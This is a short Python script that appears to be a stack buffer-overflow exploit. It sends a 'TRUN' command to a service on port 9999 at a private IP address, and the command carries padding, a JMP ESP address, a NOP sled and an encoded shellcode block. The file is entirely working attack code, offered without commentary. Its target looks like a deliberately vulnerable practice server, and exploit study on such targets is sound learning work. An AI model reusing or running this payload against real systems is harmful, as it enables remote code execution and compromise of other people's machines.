import os
import subprocess
import socket
host = "192.168.254.29"
port = 9999
offset = "A"*2003
noop = "\x90"*32
JMP_esp = "\xaf\x11\x50\x62"

shellcode =  ""
shellcode += "\xd9\xcb\xb8\xf5\x2f\xef\x93\xd9\x74\x24\xf4\x5d\x29"
shellcode += "\xc9\xb1\x56\x31\x45\x18\x03\x45\x18\x83\xed\x09\xcd"
shellcode += "\x1a\x6f\x19\x90\xe5\x90\xd9\xf5\x6c\x75\xe8\x35\x0a"
shellcode += "\xfd\x5a\x86\x58\x53\x56\x6d\x0c\x40\xed\x03\x99\x67"
shellcode += "\x46\xa9\xff\x46\x57\x82\x3c\xc8\xdb\xd9\x10\x2a\xe2"
shellcode += "\x11\x65\x2b\x23\x4f\x84\x79\xfc\x1b\x3b\x6e\x89\x56"
shellcode += "\x80\x05\xc1\x77\x80\xfa\x91\x76\xa1\xac\xaa\x20\x61"
shellcode += "\x4e\x7f\x59\x28\x48\x9c\x64\xe2\xe3\x56\x12\xf5\x25"
shellcode += "\xa7\xdb\x5a\x08\x08\x2e\xa2\x4c\xae\xd1\xd1\xa4\xcd"
shellcode += "\x6c\xe2\x72\xac\xaa\x67\x61\x16\x38\xdf\x4d\xa7\xed"
shellcode += "\x86\x06\xab\x5a\xcc\x41\xaf\x5d\x01\xfa\xcb\xd6\xa4"
shellcode += "\x2d\x5a\xac\x82\xe9\x07\x76\xaa\xa8\xed\xd9\xd3\xab"
shellcode += "\x4e\x85\x71\xa7\x62\xd2\x0b\xea\xea\x17\x26\x15\xea"
shellcode += "\x3f\x31\x66\xd8\xe0\xe9\xe0\x50\x68\x34\xf6\xe1\x7e"
shellcode += "\xc7\x28\x49\xee\x39\xc9\xa9\x26\xfe\x9d\xf9\x50\xd7"
shellcode += "\x9d\x92\xa0\xd8\x4b\x0e\xab\x4e\xb4\x66\x55\x90\x5c"
shellcode += "\x74\xaa\xbc\xc0\xf1\x4c\xee\xa8\x51\xc1\x4f\x19\x11"
shellcode += "\xb1\x27\x73\x9e\xee\x58\x7c\x75\x87\xf3\x93\x23\xff"
shellcode += "\x6b\x0d\x6e\x8b\x0a\xd2\xa5\xf1\x0d\x58\x4f\x05\xc3"
shellcode += "\xa9\x3a\x15\x34\xce\xc4\xe5\xc5\x7b\xc4\x8f\xc1\x2d"
shellcode += "\x93\x27\xc8\x08\xd3\xe7\x33\x7f\x60\xef\xcc\xfe\x50"
shellcode += "\x9b\xfb\x94\xdc\xf3\x03\x79\xdc\x03\x52\x13\xdc\x6b"
shellcode += "\x02\x47\x8f\x8e\x4d\x52\xbc\x02\xd8\x5d\x94\xf7\x4b"
shellcode += "\x36\x1a\x21\xbb\x99\xe5\x04\xbf\xde\x19\xda\xe8\x46"
shellcode += "\x71\x24\xa9\x76\x81\x4e\x29\x27\xe9\x85\x06\xc8\xd9"
shellcode += "\x66\x8d\x81\x71\xec\x40\x63\xe0\xf1\x48\x25\xbc\xf2"
shellcode += "\x7f\xfe\x4f\x88\xf0\x01\xb0\x6d\x19\x66\xb1\x6d\x25"
shellcode += "\x98\x8e\xbb\x1c\xee\xd1\x7f\x1b\xe1\x64\xdd\x0a\x68"
shellcode += "\x86\x71\x4c\xb9"

exploit_buff = "TRUN /.:/" + offset +JMP_esp + noop + shellcode
connectme = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connectme.connect((host, port))
connectme.send(exploit_buff)
connectme.close()
